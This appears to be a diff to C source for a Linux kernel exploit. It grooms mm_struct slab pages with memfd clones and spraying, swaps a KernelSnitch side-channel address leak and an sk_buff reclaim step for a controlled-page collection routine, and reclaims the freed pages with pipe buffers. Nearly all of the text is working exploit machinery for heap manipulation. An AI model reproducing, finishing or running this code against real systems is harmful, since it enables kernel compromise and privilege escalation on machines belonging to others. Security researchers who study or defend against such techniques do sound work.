@@ -88,17 +88,9 @@ void init_ctx(struct mm_ctx *ctx, size_t cnt) {
   ctx->memfds = calloc(sizeof(int), cnt);
 }
 
-static void pipe_child_release_ctx(struct mm_ctx *prep, struct mm_ctx *spray,
-                                   struct mm_ctx *pre, struct mm_ctx *post,
-                                   void *buf) {
+static void pipe_child_release_ctx(struct mm_ctx *prep, void *buf) {
   close_ctx_memfds(prep);
-  close_ctx_memfds(spray);
-  close_ctx_memfds(pre);
-  close_ctx_memfds(post);
   free_ctx_storage(prep);
-  free_ctx_storage(spray);
-  free_ctx_storage(pre);
-  free_ctx_storage(post);
   free(buf);
 }
 
@@ -351,140 +343,41 @@ void free_pipe_object(int pipefd[2]) {
 
 uintptr_t prepare_pipe_buffer_page_child(void) {
   struct mm_ctx prep;
-  struct mm_ctx spray;
-  struct mm_ctx pre;
-  struct mm_ctx post;
   size_t objs_per_slab = ORDER3_SIZE / MM_STRUCT_SZ;
 
   pin_to_core(CORE);
   init_ctx(&prep, 32 * objs_per_slab);
-  init_ctx(&spray, (1 + MM_PARTIALS) * objs_per_slab);
-  init_ctx(&pre, objs_per_slab - 1);
-  init_ctx(&post, objs_per_slab);
 
   for (size_t i = 0; i < prep.mm_cnt; i++) {
     prep.childs[i] = -1;
     prep.memfds[i] = clone_memfd();
   }
-  for (size_t i = 0; i < spray.mm_cnt; i++) {
-    spray.childs[i] = -1;
-    spray.memfds[i] = clone_memfd();
-  }
 
-  setup_kernelsnitch();
-
-  for (size_t i = 0; i < pre.mm_cnt; i++) {
-    pre.childs[i] = -1;
-    pre.memfds[i] = clone_memfd();
-  }
-  pid_t leak_child = clone_leak_child();
-  for (size_t i = 0; i < post.mm_cnt; i++) {
-    post.childs[i] = -1;
-    post.memfds[i] = clone_memfd();
-  }
-  int leak_memfd = open_memfd(leak_child);
-
-  for (size_t i = 0; i < pre.mm_cnt; i++) {
-    kill_child(pre.childs[i]);
-  }
-  for (size_t i = 0; i < post.mm_cnt; i++) {
-    kill_child(post.childs[i]);
-  }
-  for (size_t i = 0; i < spray.mm_cnt; i++) {
-    kill_child(spray.childs[i]);
-  }
-  SYSCHK(waitpid(leak_child, NULL, 0));
-
-  if (!kernelsnitch_collisions_ready()) {
-    pr_error("pipe KernelSnitch collision finding failed\n");
-  }
-
-  unsigned char *buf = malloc(SKB_SEND_SIZE);
-  memset(buf, 0x50, SKB_SEND_SIZE);
-
-  run_kernelsnitch_bruteforce();
-  uintptr_t leaked = cleanup_kernelsnitch();
-  if (leaked == (uintptr_t)-1) {
-    pr_warning("pipe KernelSnitch sk_buff page leak failed\n");
-    pipe_child_release_ctx(&prep, &spray, &pre, &post, buf);
+  int group_fds[ORDER3_SIZE / MM_STRUCT_SZ];
+  uintptr_t base = 0;
+  if (!collect_controlled_mm_group((size_t)sysconf(_SC_NPROCESSORS_ONLN),
+                                   &base, group_fds)) {
+    pipe_child_release_ctx(&prep, NULL);
     return 0;
   }
-  uintptr_t base = leaked & ~(ORDER3_SIZE - 1);
-  pr_info("pipe mm leaked=%016zx base=%016zx object_index=%zu\n",
-          leaked, base, (leaked - base) / MM_STRUCT_SZ);
-#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
-  if (getenv("KS_LEAK_ONLY")) {
-    pr_success("KernelSnitch leak-only mm=%016zx base=%016zx object_index=%zu\n",
-               leaked, base, (leaked - base) / MM_STRUCT_SZ);
-    fflush(NULL);
-    _exit(0);
+  pr_info("pipe controlled page base=%016zx\n", base);
+
+  for (size_t i = 0; i + 1 < ORDER3_SIZE / MM_STRUCT_SZ; ++i) {
+    SYSCHK(close(group_fds[i]));
+    group_fds[i] = -1;
   }
-#endif
+  SYSCHK(close(group_fds[ORDER3_SIZE / MM_STRUCT_SZ - 1]));
 
-  int skb_sv[2];
-  int pcp_sv[2];
-  SYSCHK(socketpair(AF_UNIX, SOCK_STREAM, 0, skb_sv));
-  SYSCHK(socketpair(AF_UNIX, SOCK_STREAM, 0, pcp_sv));
-
-  struct iovec iov;
-  memset(&iov, 0, sizeof(iov));
-  iov.iov_base = buf;
-  iov.iov_len = SKB_SEND_SIZE;
-
-  struct msghdr msg;
-  memset(&msg, 0, sizeof(msg));
-  msg.msg_iov = &iov;
-  msg.msg_iovlen = 1;
-
-  SYSCHK(sendmsg(pcp_sv[0], &msg, 0));
-  pin_to_core(CORE);
-
-  sched_yield();
-  sched_yield();
-  sched_yield();
-  sched_yield();
-  for (size_t i = 0; i < pre.mm_cnt; i++) {
-    SYSCHK(close(pre.memfds[i]));
-    pre.memfds[i] = -1;
-  }
-  for (size_t i = 0; i < post.mm_cnt - 1; i++) {
-    SYSCHK(close(post.memfds[i]));
-    post.memfds[i] = -1;
-  }
-  for (size_t i = 0; i < spray.mm_cnt; i += objs_per_slab) {
-    SYSCHK(close(spray.memfds[i]));
-    spray.memfds[i] = -1;
-  }
-  SYSCHK(close(pcp_sv[0]));
-  SYSCHK(close(pcp_sv[1]));
-
-  sched_yield();
-  sched_yield();
-  sched_yield();
-  sched_yield();
-  SYSCHK(close(leak_memfd));
   for (size_t i = 0; i < prep.mm_cnt; i += objs_per_slab) {
     if (prep.memfds[i] > 0) {
       SYSCHK(close(prep.memfds[i]));
       prep.memfds[i] = -1;
     }
   }
-
-  int sndbuf = 1 << 20;
-  setsockopt(skb_sv[0], SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));
-  struct iovec slide_iov;
-  memset(&slide_iov, 0, sizeof(slide_iov));
-  slide_iov.iov_base = buf;
-  slide_iov.iov_len = SLIDE_SKB_SEND_SIZE;
-  struct msghdr slide_msg;
-  memset(&slide_msg, 0, sizeof(slide_msg));
-  slide_msg.msg_iov = &slide_iov;
-  slide_msg.msg_iovlen = 1;
-  for (int i = 0; i < SKB_RECLAIM_SENDS; i++) {
-    if (sendmsg(skb_sv[0], &slide_msg, MSG_DONTWAIT) <= 0) {
-      break;
-    }
-  }
+  sched_yield();
+  sched_yield();
+  sched_yield();
+  sched_yield();
 
   /* [pipefix] budget plan (campaign 13/15/16 arithmetic): F_SETPIPE_SZ
    * growth is charged per-real-uid against fs.pipe-user-pages-soft, and
@@ -515,17 +408,15 @@ uintptr_t prepare_pipe_buffer_page_child(void) {
   }
 
   pin_to_core(CORE);
-  SYSCHK(close(skb_sv[0]));
-  SYSCHK(close(skb_sv[1]));
   for (size_t i = 0; i < PIPE_RECLAIM; i++) {
     if (alloc_pipe_object(pipe_fds_reclaim[i]) != 0) {
       pr_warning("p0 pipe ring alloc failed reclaim=%zu\n", i);
-      pipe_child_release_ctx(&prep, &spray, &pre, &post, buf);
+      pipe_child_release_ctx(&prep, NULL);
       return 0;
     }
   }
 
-  pipe_child_release_ctx(&prep, &spray, &pre, &post, buf);
+  pipe_child_release_ctx(&prep, NULL);
   return base;
 }
 
